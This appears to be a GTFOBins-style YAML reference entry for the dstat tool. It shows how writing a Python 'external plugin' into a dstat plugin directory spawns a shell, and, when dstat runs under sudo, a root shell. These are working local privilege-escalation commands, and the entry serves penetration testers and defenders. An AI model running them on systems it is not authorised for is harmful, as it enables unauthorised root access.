---
description: |
  `dstat` allows you to run arbitrary [`python`](/gtfobins/python/) scripts loaded as "external plugins" if they are located in one of the directories stated in the `dstat` man page under "FILES":

  1. `~/.dstat/`
  2. `(path of binary)/plugins/`
  3. `/usr/share/dstat/`
  4. `/usr/local/share/dstat/`

  Pick the one that you can write into.
functions:
  shell:
    - code: |
        mkdir -p ~/.dstat
        echo 'import os; os.execv("/bin/sh", ["sh"])' >~/.dstat/dstat_xxx.py
        dstat --xxx
  sudo:
    - code: |
        echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py
        sudo dstat --xxx
---
